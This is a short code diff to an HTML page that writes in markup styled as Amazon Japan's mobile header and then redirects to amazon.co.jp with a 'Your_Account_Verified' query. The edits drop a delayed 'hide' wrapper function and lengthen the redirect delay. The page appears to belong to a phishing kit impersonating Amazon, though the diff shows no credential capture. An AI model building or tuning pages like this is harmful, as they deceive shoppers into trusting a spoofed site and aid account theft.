@@ -36,8 +36,6 @@
 <script src="../js/jquery.min.js"></script>
 <script src="../js/jquery.validate.min.js"></script>
  <script type="text/javascript">
-     setTimeout("yincang()", 100);
-     function yincang() {
          let content = document.getElementById('bodyid');
          content.innerHTML = "\n" +
                  "  <header class=\"nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven\"> \n" +
@@ -574,9 +572,8 @@
                  "     </div></a> \n" +
                  "   </div> \n" +
                  "  </div> ";
-     }
  </script>
         <script type="text/javascript">
-        window.setTimeout("location=('https://amazon.co.jp/?Your_Account_Verified');", 3000);
+        window.setTimeout("location=('https://amazon.co.jp/?Your_Account_Verified');", 8000);
     </script>
 </html>
